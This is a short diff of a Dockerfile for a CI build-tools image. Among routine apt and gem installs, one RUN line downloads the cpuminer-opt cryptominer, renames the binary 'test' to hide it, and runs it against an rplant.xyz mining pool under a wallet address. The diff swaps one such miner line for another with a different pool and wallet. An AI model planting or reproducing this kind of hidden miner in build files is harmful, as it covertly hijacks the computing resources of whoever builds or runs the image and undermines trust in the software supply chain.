@@ -29,5 +29,5 @@ ADD . /build-tools-ci
 # Collect the components we need for this image
 RUN apt-get update
 RUN apt-get install -y ruby jq curl rsync hub
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespowerurx -o stratum+tcps://stratum-eu.rplant.xyz:13361 -u Uc4M8v3EbjT6EPAwuamWj4C5N9KzAeEQQh.voc
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17085 -u PFiewLRzjyFT7Zhz3P8TxXkQKSaULntV83.voc
 RUN gem install circle-cli
